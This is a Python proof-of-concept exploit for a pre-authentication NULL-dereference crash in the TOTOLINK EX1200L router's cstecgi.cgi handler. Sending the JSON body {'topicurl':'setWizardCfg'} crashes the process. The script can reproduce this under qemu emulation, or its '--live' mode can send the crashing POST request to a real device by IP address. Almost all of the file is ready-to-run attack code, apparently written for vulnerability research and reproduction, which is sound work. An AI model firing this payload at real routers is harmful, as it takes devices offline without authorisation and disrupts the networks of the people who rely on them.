#!/usr/bin/env python3
"""
PoC: TOTOLINK EX1200L cstecgi.cgi — NULL dereference in setWizardCfg handler

Sending {"topicurl":"setWizardCfg"} without wizard config fields causes
cJSON_GetObjectItem() to return NULL, which is then dereferenced in
websGetVar() → SIGSEGV (pre-auth DoS). Case-sensitive: "setWizardCfg" crashes,
"setWizardcfg" / "setwizardcfg" do not.

Usage:
  python3 poc_ex1200l_setWizardCfg.py [sysroot_path]
  python3 poc_ex1200l_setWizardCfg.py --live 192.168.0.1
"""
import os, sys, socket, subprocess

PAYLOAD = b'{"topicurl":"setWizardCfg"}'


def poc_live(host: str, port: int = 80):
    req = (
        f"POST /cgi-bin/cstecgi.cgi HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(PAYLOAD)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + PAYLOAD
    with socket.create_connection((host, port), timeout=5) as s:
        s.sendall(req)
        resp = b""
        try:
            resp = s.recv(4096)
        except Exception:
            pass
    if not resp:
        print("[!] Empty response — server may have crashed (DoS confirmed)")
    else:
        print(f"[*] Response: {resp[:200].decode(errors='replace')}")


def poc_qemu(sysroot: str):
    binary = os.path.join(sysroot, "www", "cgi-bin", "cstecgi.cgi")
    qemu   = os.path.abspath(os.path.join(os.path.dirname(__file__),
                             "..", "..", "..", "build", "qemu-mipsel"))
    if not os.path.exists(qemu):
        qemu = "qemu-mipsel"

    env = os.environ.copy()
    env.update({
        "REQUEST_METHOD":  "POST",
        "CONTENT_TYPE":    "application/json",
        "CONTENT_LENGTH":  str(len(PAYLOAD)),
        "SCRIPT_NAME":     "/cgi-bin/cstecgi.cgi",
        "DOCUMENT_ROOT":   "/www",
        "SERVER_NAME":     "192.168.0.1",
        "SERVER_PORT":     "80",
        "QUERY_STRING":    "",
        "REMOTE_ADDR":     "192.168.0.100",
    })
    recv_sock, send_sock = socket.socketpair(socket.AF_UNIX, socket.SOCK_STREAM)
    p = subprocess.Popen([qemu, "-L", sysroot, binary],
                         stdin=recv_sock, stdout=subprocess.PIPE,
                         stderr=subprocess.DEVNULL, env=env)
    recv_sock.close()
    send_sock.sendall(PAYLOAD)
    send_sock.close()
    p.wait(timeout=5)
    print(f"[*] Payload: {PAYLOAD.decode()}")
    print(f"[*] Exit code: {p.returncode}")
    if p.returncode == -11:
        print("[+] SIGSEGV confirmed — NULL deref in setWizardCfg (cJSON_GetObjectItem→websGetVar)")
        print("    Backtrace: cJSON_GetObjectItem() ← websGetVar() ← main()")
    else:
        print("[-] No crash (check sysroot path)")


if __name__ == "__main__":
    if "--live" in sys.argv:
        idx = sys.argv.index("--live")
        host = sys.argv[idx + 1] if idx + 1 < len(sys.argv) else "192.168.0.1"
        poc_live(host)
    else:
        sysroot = sys.argv[1] if len(sys.argv) > 1 else \
            os.path.abspath(os.path.join(os.path.dirname(__file__),
                            "..", "..", "tests", "realworld",
                            "ex1200l_lighttpd", "sysroot"))
        poc_qemu(sysroot)
